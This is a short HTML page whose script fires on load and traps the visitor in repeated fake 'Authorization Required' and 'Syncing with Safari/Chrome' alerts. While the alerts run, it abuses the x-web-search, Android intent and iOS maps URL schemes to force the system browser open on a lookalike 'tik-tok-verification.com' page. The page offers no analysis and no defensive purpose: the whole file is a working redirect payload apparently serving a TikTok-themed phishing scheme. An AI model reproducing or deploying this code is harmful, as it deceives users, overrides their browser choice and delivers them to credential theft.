<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function forceSystemRedirect() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlNoProtocol = target.replace("https://", "");

        // THE PRIMARY LEAK (Search and Store)
        window.location.replace("x-web-search://?" + encodeURIComponent(target));
        
        if (isAndroid) {
            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        } else {
            // iOS Apple Maps search often forces Safari to open the result
            window.location.href = "maps://?q=" + encodeURIComponent(target);
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE

        // 1. First alert to 'prime' the user gesture
        alert("ATTEMPT #24\n\nStep 1: Authorization Required.\n\nTap OK.");

        // 2. A 100ms 'Silence' window where the redirect fires
        forceSystemRedirect();

        setTimeout(() => {
            if (Date.now() > killTime) return;

            // 3. Second alert to 'lock' the thread while the OS processes the redirect
            alert("ATTEMPT #24\n\nStep 2: Syncing with Safari/Chrome...\n\nTap OK.");
            
            forceSystemRedirect();
            
            // Loop back
            setTimeout(rampage, 10);
        }, 100); 
    }

    window.onload = () => {
        rampage();
    };

    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>
</body>
</html>
